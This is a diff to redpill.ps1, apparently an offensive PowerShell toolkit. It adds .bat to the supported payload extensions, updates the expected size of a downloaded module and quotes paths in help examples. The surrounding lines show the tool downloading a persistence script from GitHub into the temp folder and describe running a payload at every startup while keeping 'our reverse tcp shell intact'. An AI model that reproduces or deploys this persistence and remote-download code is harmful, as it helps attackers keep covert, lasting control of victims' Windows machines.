@@ -1676,7 +1676,7 @@ If($Persiste -ne "false" -or $Persiste -ieq "Stop"){
       Remark: Use double quotes if Path has any empty spaces in name.
       Remark: '-GetProcess Enum -ProcessName Wscript.exe' can be used
       to manual check the status of wscript process (BeaconHome function)
-      Remark: Payload supported extensions: ps1|exe|py|vbs
+      Remark: Payload supported extensions: ps1|exe|py|vbs|bat
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -Persiste Stop
@@ -1708,7 +1708,7 @@ If($Persiste -ne "false" -or $Persiste -ieq "Stop"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Persiste.ps1 -Destination $Env:TMP\Persiste.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\Persiste.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,0419921875/KB
+      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,1796875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\Persiste.ps1"){Remove-Item -Path "$Env:TMP\Persiste.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2736,7 +2736,7 @@ $HelpParameters = @"
       Remark: Use double quotes if Path has any empty spaces in name.
       Remark: '-GetProcess Enum -ProcessName Wscript.exe' can be used
       to manual check the status of wscript process (BeaconHome function)
-      Remark: Payload supported extensions: ps1|exe|py|vbs
+      Remark: Payload supported extensions: ps1|exe|py|vbs|bat
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -Persiste Stop
@@ -2745,11 +2745,11 @@ $HelpParameters = @"
       and deletes persiste.vbs Leaving our reverse tcp shell intact.
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -Persiste `$Env:TMP\Payload.ps1
+      PS C:\> powershell -File redpill.ps1 -Persiste "`$Env:TMP\Payload.ps1"
       Execute Payload.ps1 at every StartUp with 10 sec of interval between each execution
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -Persiste `$Env:TMP\Payload.ps1 -BeaconTime 28
+      PS C:\> powershell -File redpill.ps1 -Persiste "`$Env:TMP\Payload.ps1" -BeaconTime 28
       Execute Payload.ps1 at every StartUp with 28 sec of interval between each execution
 
    .OUTPUTS
